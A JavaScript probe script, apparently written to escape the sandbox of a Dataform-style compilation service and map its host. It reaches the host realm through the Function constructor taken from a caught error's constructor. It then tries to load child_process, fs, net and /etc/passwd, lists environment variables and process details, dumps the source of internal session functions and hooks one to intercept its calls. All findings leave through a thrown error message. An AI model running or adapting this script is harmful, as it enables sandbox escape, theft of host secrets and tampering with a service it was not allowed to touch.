// Focused probe — require.transpiler, host realm require, vm.compileModule, session method closures.

var out = {};
function safe(k, fn) {
  try {
    var v = fn();
    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 1200);
  } catch(e) {
    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 350);
  }
}

// ============ TIER A: require.transpiler deep ============
safe('A1_transpiler_type', function() { return typeof require.transpiler; });
safe('A2_transpiler_src', function() { return String(require.transpiler).substring(0, 1000); });
safe('A3_transpiler_keys', function() { return Object.getOwnPropertyNames(require.transpiler || {}).join(','); });
safe('A4_transpiler_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(require.transpiler) || {}).join(','); });
safe('A5_transpiler_call_simple', function() {
  try { return String(require.transpiler('return 42')).substring(0, 500); } catch(e) { return 'err:' + e.message; }
});
safe('A6_transpiler_call_eval', function() {
  try { return String(require.transpiler('process.env')).substring(0, 500); } catch(e) { return 'err:' + e.message; }
});
safe('A7_transpiler_call_obj', function() {
  try { return String(require.transpiler({source: 'return 1'})).substring(0, 500); } catch(e) { return 'err:' + e.message; }
});

// ============ TIER B: require as constructor / function ============
safe('B1_require_src', function() { return String(require).substring(0, 800); });
safe('B2_require_prototype', function() { return Object.getOwnPropertyNames(require.prototype || {}).join(','); });
safe('B3_new_require', function() {
  try { var r = new require(); return 'made ' + typeof r + ' keys:' + Object.getOwnPropertyNames(r).join(','); } catch(e) { return 'err:' + e.message; }
});
safe('B4_require_call_various', function() {
  var paths = ['fs', 'child_process', 'net', 'path', '/etc/passwd', './bundle.js', '@dataform/core', 'crypto', 'http', 'https'];
  var results = {};
  for (var i = 0; i < paths.length; i++) {
    try {
      var r = require(paths[i]);
      results[paths[i]] = 'GOT typeof=' + typeof r + ' keys=' + (typeof r === 'object' ? Object.keys(r || {}).slice(0,10).join(',') : '');
    } catch(e) { results[paths[i]] = 'err:' + e.message.substring(0,80); }
  }
  return JSON.stringify(results);
});

// ============ TIER C: HOST realm require deep probe ============
safe('C1_host_realm_require', function() {
  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('var probes = ["fs","child_process","net","path","crypto","http","https","os","child_process","tty","stream","url","util","vm","events","buffer","timers","module","process","Buffer","global"]; var r = {}; for (var p of probes) { try { var m = require(p); r[p] = "GOT keys:" + Object.keys(m||{}).slice(0,12).join(","); } catch(e) { r[p] = "err:" + e.message.substring(0,60); } } return JSON.stringify(r);')();
});

safe('C2_host_realm_globalThis_full', function() {
  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return Object.getOwnPropertyNames(globalThis).sort().join(",")')();
});

safe('C3_host_eval_process_props', function() {
  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('try { return JSON.stringify({argv: process.argv, env_keys: Object.keys(process.env).slice(0,50), execPath: process.execPath, versions: process.versions, pid: process.pid}); } catch(e) { return "err:" + e.message; }')();
});

safe('C4_host_realm_dirname', function() {
  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
  var F = herr().constructor.constructor;
  return F('return typeof __dirname + "=" + (typeof __dirname !== "undefined" ? __dirname : "n/a") + " | filename:" + (typeof __filename !== "undefined" ? __filename : "n/a")')();
});

// ============ TIER D: vm.compileModule formats ============
safe('D1_vm_compileModule_obj', function() {
  try { var m = vm.compileModule({source: 'return 1'}); return 'obj_arg: ' + typeof m; } catch(e) { return 'err:' + e.message; }
});
safe('D2_vm_compileModule_with_id', function() {
  try { var m = vm.compileModule('return 1', 'test_module'); return 'with_id: ' + typeof m; } catch(e) { return 'err:' + e.message; }
});
safe('D3_vm_compileModule_factory', function() {
  try {
    var m = vm.compileModule('module.exports = function() { return typeof process; }');
    if (typeof m === 'function') { return 'func: ' + m(); }
    if (typeof m === 'object' && m) {
      var keys = Object.getOwnPropertyNames(m).join(',');
      var execResult = 'no_exec';
      try { execResult = String(m.exports || m.default || m); } catch(e) {}
      return 'obj keys:' + keys + ' exec:' + execResult.substring(0,200);
    }
    return 'other: ' + typeof m;
  } catch(e) { return 'err:' + e.message; }
});

// ============ TIER E: session.compile closures via toString ============
safe('E1_session_compile_full_src', function() { return String(global._DF_SESSION.compile).substring(0, 3000); });
safe('E2_session_sqlxAction_src', function() { return String(global._DF_SESSION.sqlxAction).substring(0, 2500); });
safe('E3_session_compileGraphChunk_src', function() { return String(global._DF_SESSION.compileGraphChunk).substring(0, 2500); });
safe('E4_session_resolve_src', function() { return String(global._DF_SESSION.resolve).substring(0, 2000); });

// ============ TIER F: Hook session.sqlxAction to intercept ============
safe('F1_sqlxAction_intercept', function() {
  var s = global._DF_SESSION;
  if (typeof s.sqlxAction !== 'function') return 'no_sqlxAction';
  var origSqlx = s.sqlxAction.bind(s);
  s.sqlxAction = function() {
    try {
      out.F1a_sqlx_called_with = JSON.stringify(Array.from(arguments).map(function(a) { return typeof a; })).substring(0,300);
      if (arguments[0] && typeof arguments[0] === 'object') {
        out.F1b_sqlx_arg_keys = Object.keys(arguments[0]).join(',');
      }
    } catch(e) { out.F1_err = e.message; }
    return origSqlx.apply(this, arguments);
  };
  return 'hooked';
});

// ============ TIER G: dataform / publish / operate / assert globals deep ============
safe('G1_dataform_global', function() { return typeof dataform + ' keys:' + Object.getOwnPropertyNames(dataform || {}).join(','); });
safe('G2_publish_src', function() { return String(globalThis.publish).substring(0, 600); });
safe('G3_operate_src', function() { return String(globalThis.operate).substring(0, 600); });
safe('G4_declare_src', function() { return String(globalThis.declare).substring(0, 600); });

// ============ TIER H: core global ============
safe('H1_core_keys', function() { return Object.getOwnPropertyNames(core || {}).join(','); });
safe('H2_core_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(core) || {}).join(','); });
safe('H3_core_str', function() { return String(core).substring(0, 500); });

// ============ TIER I: mainWithVersionCheck — was in globalThis ============
safe('I1_mainWithVersionCheck_src', function() { return String(globalThis.mainWithVersionCheck).substring(0, 1000); });

// Provide notebook shape
module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };

throw new Error('FULL_v2_PROBE:' + JSON.stringify(out));
